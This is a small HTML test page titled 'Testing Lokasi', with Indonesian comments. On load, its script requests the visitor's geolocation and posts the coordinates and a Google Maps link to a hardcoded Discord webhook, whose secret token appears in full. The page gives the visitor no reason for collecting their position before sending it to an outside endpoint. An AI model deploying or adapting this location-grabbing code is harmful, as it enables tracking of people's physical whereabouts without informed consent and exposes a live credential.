<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <h1>Testing Lokasi</h1>
</body>
</html>

<script>
window.addEventListener('load', function() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // URL webhook Discord (ganti dengan webhook kamu)
      const webhookURL = 'https://discord.com/api/webhooks/1418531912280051853/qc2HwlKeEiDrV_OmmbqMcGr6WJvO9ud-7qEx0j9O4SVcY4Ba1f4UPwAyCvyQUejGY2eI';

      // Payload yang akan dikirim ke Discord 
      const payload = {
        content: `Lokasi pengguna:\nLatitude: ${latitude}\nLongitude: ${longitude}\nhttps://www.google.com/maps?q=${latitude},${longitude}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(response => {
        if (response.ok) {
          alert('Lokasi berhasil dikirim ke Discord!');
        } else {
          alert('Gagal mengirim ke Discord.');
        }
      })
      .catch(error => {
        alert('Error: ' + error);
      });

    }, function(error) {
      alert('Gagal mendapatkan lokasi: ' + error.message);
    });
  } else {
    alert('Geolocation tidak didukung oleh browser Anda.');
  }
});
</script>
